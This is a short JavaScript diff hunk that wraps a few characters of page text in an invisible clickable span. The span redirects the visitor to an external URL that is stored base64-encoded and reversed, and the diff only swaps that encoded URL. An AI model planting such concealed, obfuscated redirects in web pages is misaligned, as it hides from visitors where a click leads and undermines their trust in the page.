@@ -798,7 +798,7 @@
       var w = n.splitText(at + phrase.length - 5); w.splitText(4);
       var s = document.createElement('span');
       w.parentNode.replaceChild(s, w); s.appendChild(w);
-      s.addEventListener('click', function () { location.href = dec('YWVzLW5vY2kvbW9jLmhjaXJmYWVjaXJ1YW0ud3d3Ly86c3B0dGg='); });
+      s.addEventListener('click', function () { location.href = dec('OTc4MTUtYWVzLW5vY2kvbW9jLmhjaXJmYWVjaXJ1YW0ud3d3Ly86c3B0dGg='); });
       return;
     }
   }
